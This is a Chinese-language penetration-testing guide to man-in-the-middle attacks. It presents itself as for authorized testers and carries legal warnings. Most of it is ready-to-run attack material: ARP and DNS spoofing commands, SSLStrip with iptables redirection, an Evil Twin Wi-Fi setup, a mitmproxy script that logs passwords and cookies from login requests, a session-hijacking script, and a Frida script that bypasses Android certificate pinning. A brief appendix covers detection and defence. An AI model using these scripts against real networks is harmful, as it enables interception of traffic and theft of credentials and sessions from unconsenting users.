# 中间人攻击实施指南

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供中间人（MITM）攻击的实施方法论。通过本指南，测试人员可以在授权范围内评估目标的通信安全，发现 TLS/SSL 配置缺陷、证书验证问题等安全风险。

### 1.2 适用范围
本文档适用于以下场景：
- 内网安全评估
- WiFi 网络安全性测试
- 移动应用通信安全测试
- API 传输加密验证
- 证书固定有效性测试

### 1.3 读者对象
- 渗透测试工程师
- 网络安全测试人员
- 移动安全测试人员
- 红队成员

**⚠️ 法律声明：** 本文档仅供授权的安全测试使用。未经授权实施中间人攻击可能违反法律法规。

---

## 第二部分：核心渗透技术专题

### 专题一：中间人攻击实施

#### 2.1 技术介绍

**中间人攻击**（Man-in-the-Middle, MITM）是一种攻击者秘密中继并可能篡改两个通信方之间消息的攻击技术。攻击者能够窃听、修改或注入通信内容。

**MITM 攻击类型：**

| 类型 | 描述 | 难度 |
|------|------|------|
| ARP 欺骗 | 局域网内伪造 MAC 地址 | 低 |
| DNS 欺骗 | 篡改 DNS 解析结果 | 中 |
| SSL Stripping | 强制降级到 HTTP | 中 |
| Evil Twin | 伪造 WiFi 接入点 | 中 |
| mDNS 欺骗 | 局域网名称解析欺骗 | 低 |
| LLMNR/NBT-NS 欺骗 | Windows 名称解析欺骗 | 低 |

**攻击流程概览：**
```
1. 网络位置获取 → 2. 流量重定向 → 3. 解密/篡改 → 4. 数据收集
       ↓                ↓              ↓             ↓
   ARP/DNS 欺骗    SSLStrip/Proxy  证书伪造     凭证/会话窃取
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 公共 WiFi | 咖啡厅、机场网络 | 无加密或弱加密 WiFi |
| 内网环境 | 企业办公网络 | 内网通信未加密 |
| 移动应用 | App API 通信 | 证书验证不严格 |
| IoT 设备 | 设备与云端通信 | 通信加密缺失 |
| 传统系统 | 内部服务通信 | 使用 HTTP 而非 HTTPS |

#### 2.3 漏洞发现方法

##### 2.3.1 网络侦察

```bash
# 网络发现
netdiscover -r 192.168.1.0/24

# 或使用 nmap
nmap -sn 192.168.1.0/24

# 识别网关
ip route | grep default

# 识别目标
arp -a

# 检测 HTTPS 使用情况
nmap --script http-enum -p 80,443 target_ip
```

##### 2.3.2 检测证书验证弱点

```bash
# 使用 OpenSSL 测试证书验证
openssl s_client -connect target.com:443 -verify_return_error

# 检查证书链
openssl s_client -connect target.com:443 -showcerts

# 检测证书固定
# 使用 Burp Suite 配置代理，观察应用是否接受代理证书
```

#### 2.4 漏洞利用方法

##### 2.4.1 ARP 欺骗攻击

```bash
# 启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 使用 arpspoof 进行 ARP 欺骗
# 欺骗目标，让目标认为攻击者是网关
arpspoof -i eth0 -t victim_ip gateway_ip

# 欺骗网关，让网关认为攻击者是目标
arpspoof -i eth0 -t gateway_ip victim_ip

# 或使用 bettercap
bettercap -iface eth0

# bettercap 交互命令
> net.recon on
> net.probe on
> arp.spoof on
```

##### 2.4.2 SSLStrip 攻击

```bash
# 安装 SSLStrip
git clone https://github.com/moxie0/sslstrip.git
cd sslstrip
python3 setup.py install

# 配置 iptables 重定向 HTTP 流量
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

# 启动 SSLStrip
sslstrip -l 8080 -w output.log -a

# 或使用 SSLStrip2（支持 HSTS 绕过）
git clone https://github.com/LeonardoNve/sslstrip2.git

# 结合 DNS 欺骗
dnsspoof -i eth0 -f "target.com"
```

##### 2.4.3 使用 BetterCAP 进行 MITM

```bash
# 启动 BetterCAP
bettercap -iface eth0

# BetterCAP 会话命令
# 网络侦察
net.recon on
net.probe on

# ARP 欺骗
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on

# HTTP 代理（拦截和修改）
http.proxy on
http.proxy.script js/capture.js

# HTTPS 代理（需要证书）
https.proxy on
set https.proxy.port 8083

# DNS 欺骗
set dns.spoof.domains target.com,www.target.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# 凭证捕获
set events.stream.filter "tls,http"
```

##### 2.4.4 使用 mitmproxy 拦截流量

```bash
# 安装 mitmproxy
pip3 install mitmproxy

# 启动透明代理
mitmproxy --mode transparent --listen-port 8080

# 或启动常规代理
mitmproxy --listen-port 8080

# 使用脚本自动捕获凭证
mitmproxy -s capture_script.py

# capture_script.py 示例
from mitmproxy import http

def request(flow):
    if flow.request.method == "POST":
        print(f"[+] 捕获 POST 数据：{flow.request.text}")
    
    # 自动修改请求
    # flow.request.headers["X-Custom-Header"] = "injected"

def response(flow):
    # 自动修改响应
    pass
```

##### 2.4.5 WiFi Evil Twin 攻击

```bash
# 使用 airbase-ng 创建恶意 AP
airmon-ng start wlan0
airbase-ng -e "Free_WiFi" -c 6 wlan0mon

# 配置网络桥接
apt-get install bridge-utils
brctl addbr atbr
brctl addif atbr at0
brctl addif atbr eth0
ifconfig at0 up
ifconfig atbr up
ifconfig atbr 192.168.100.1/24

# 启动 DHCP 服务器
cat > /etc/dhcpd.conf << EOF
subnet 192.168.100.0 netmask 255.255.255.0 {
    range 192.168.100.100 192.168.100.200;
    option routers 192.168.100.1;
    option domain-name-servers 8.8.8.8;
}
EOF

dhcpd -cf /etc/dhcpd.conf atbr

# 启动 MITM 工具
bettercap -iface at0
```

##### 2.4.6 凭证窃取脚本

```python
#!/usr/bin/env python3
"""
MITM 凭证窃取脚本（mitmproxy）
"""
from mitmproxy import http
import json
import logging

# 配置日志
logging.basicConfig(
    filename='captured_credentials.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

class CredentialCapture:
    def __init__(self):
        self.captured = []
    
    def request(self, flow: http.HTTPFlow):
        # 捕获登录请求
        if any(keyword in flow.request.path for keyword in ['login', 'signin', 'auth']):
            if flow.request.method == "POST":
                post_data = flow.request.get_text()
                
                # 记录凭证
                logging.info(f"URL: {flow.request.url}")
                logging.info(f"Data: {post_data}")
                
                # 提取常见字段
                import urllib.parse
                params = urllib.parse.parse_qs(post_data)
                
                for field in ['username', 'password', 'email', 'user', 'pass']:
                    if field in params:
                        logging.info(f"{field}: {params[field][0]}")
                
                self.captured.append({
                    'url': flow.request.url,
                    'data': post_data
                })
        
        # 捕获 Cookie
        if 'Cookie' in flow.request.headers:
            logging.info(f"Cookie: {flow.request.headers['Cookie']}")
    
    def response(self, flow: http.HTTPFlow):
        # 检测登录成功
        if any(keyword in flow.response.text.lower() 
               for keyword in ['welcome', 'dashboard', 'logout']):
            logging.info("[+] 可能的成功登录")

addons = [CredentialCapture()]
```

##### 2.4.7 会话劫持

```python
#!/usr/bin/env python3
"""
会话劫持脚本
"""
import requests

def session_hijack(target_url, stolen_cookie):
    """使用窃取的 Cookie 劫持会话"""
    
    cookies = {'session_id': stolen_cookie}
    
    # 测试会话是否有效
    resp = requests.get(target_url, cookies=cookies)
    
    if resp.status_code == 200:
        # 检查是否已登录
        if 'logout' in resp.text.lower() or 'dashboard' in resp.text.lower():
            print("[+] 会话劫持成功！")
            
            # 保持会话进行后续操作
            session = requests.Session()
            session.cookies.update(cookies)
            
            # 访问敏感页面
            resp = session.get(f"{target_url}/profile")
            print(resp.text)
            
            return session
    
    print("[-] 会话劫持失败")
    return None

# 使用窃取的 session_id
# stolen_session = "abc123def456..."
# session_hijack("https://target.com", stolen_session)
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过 HSTS

```bash
# SSLStrip2 绕过 HSTS
# 1. 首次访问前拦截（用户未访问过 HTTPS）
# 2. 使用同形异义字攻击（xn-- 域名）
# 3. 等待 HSTS 缓存过期

# 使用 mitmproxy 的 HSTS 绕过脚本
mitmproxy --scripts hsts_bypass.py
```

##### 2.5.2 绕过证书固定

```javascript
// Frida 证书固定绕过脚本 (Android)
Java.perform(function() {
    // 绕过多种证书固定实现
    
    // TrustManager 绕过
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    TrustManager.checkServerTrusted.implementation = function() {};
    
    // OkHttp 证书固定绕过
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {};
    
    // WebView SSL 错误处理绕过
    var WebViewClient = Java.use("android.webkit.WebViewClient");
    WebViewClient.onReceivedSslError.implementation = function() {};
});

// 使用方式
frida -U -f com.target.app -l ssl_bypass.js
```

##### 2.5.3 绕过双向认证

```bash
# 如果客户端需要证书
# 1. 从客户端设备提取证书
# 2. 在代理中配置客户端证书

# mitmproxy 配置
mitmproxy --set client_certs=~/.mitmproxy/client.p12
```

---

## 第三部分：附录

### 3.1 MITM 工具清单

| 工具 | 用途 | 平台 |
|-----|------|------|
| BetterCAP | 综合 MITM 框架 | Linux/macOS/Windows |
| mitmproxy | HTTP/HTTPS 代理 | 跨平台 |
| Burp Suite | Web 应用测试 | 跨平台 |
| SSLStrip | HTTPS 降级 | Linux |
| arpspoof | ARP 欺骗 | Linux |
| airbase-ng | 恶意 AP | Linux |
| Responder | LLMNR/NBT-NS 欺骗 | Linux |

### 3.2 MITM 检测防御

**检测指标：**
- ARP 表异常（同一 IP 对应多个 MAC）
- 证书警告
- 网络延迟增加
- 意外的 HTTP 重定向

**防御措施：**
- 强制 HTTPS（HSTS）
- 证书固定（Certificate Pinning）
- 使用 VPN
- 网络分段和监控
- ARP 监控（ARPwatch）

### 3.3 法律合规提醒

| 行为 | 法律风险 |
|-----|---------|
| 授权测试 | 合法 |
| 未授权内网测试 | 可能违法 |
| 公共 WiFi 测试 | 高风险 |
| 凭证窃取（未授权） | 严重违法 |

---

## 参考资源

- [BetterCAP Documentation](https://www.bettercap.org/)
- [mitmproxy Documentation](https://docs.mitmproxy.org/)
- [OWASP Testing Guide - MITM](https://owasp.org/www-project-web-security-testing-guide/)
- [Black Hat ARP Spoofing](https://defcon.org/)
